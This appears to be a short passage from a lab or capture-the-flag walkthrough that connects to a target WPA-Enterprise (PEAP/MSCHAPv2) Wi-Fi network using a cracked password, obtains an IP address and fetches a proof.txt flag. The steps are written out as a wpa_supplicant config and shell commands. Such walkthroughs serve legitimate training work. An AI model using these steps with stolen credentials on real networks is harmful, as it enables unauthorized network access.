> Create our conf file:

```
nano mgt.conf
```

```
network={
ssid="<target_ssid>"
scan_ssid=1
key_mgmt=WPA-EAP
eap=PEAP
identity="<target_identity>"
password="<cracked_password>"
phase1="peaplabel=0"
phase2="auth=MSCHAPV2"
}
```

> Once the file is good we can run wpa supplicant:

```
sudo wpa_supplicant -I wlan0 -c mgt.conf -B
```

> Now we can get a valid IP address on the wlan0 interface:

```
sudo dhclient wlan0 -v
```

> Once it says its bound to an IP address, we can retrieve the proof.txt file flag:

```
curl http://<ip>/proof.txt
```
